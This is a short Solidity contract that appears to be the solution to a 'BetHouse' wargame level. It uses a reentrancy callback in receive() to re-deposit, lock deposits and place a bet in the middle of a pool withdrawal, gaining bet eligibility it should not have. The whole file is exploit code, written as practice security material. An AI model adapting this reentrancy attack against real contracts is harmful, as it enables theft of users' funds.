// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {BetHouse, Pool, PoolToken} from "../levels/BetHouse.sol";

contract BetHouseAttack {
    BetHouse target;
    Pool pool;
    PoolToken depositToken;
    address bettor;

    constructor(address target_, address payable pool_, address depositToken_) payable {
        target = BetHouse(target_);
        pool = Pool(pool_);
        depositToken = PoolToken(depositToken_);
        bettor = msg.sender;
    }

    function attack() external payable {
        depositToken.approve(address(pool), 5);
        pool.deposit{value: 0.001 ether}(5);
        pool.withdrawAll();
    }

    receive() external payable {
        depositToken.approve(address(pool), 5);
        pool.deposit(5);
        pool.lockDeposits();
        target.makeBet(bettor);
    }
}
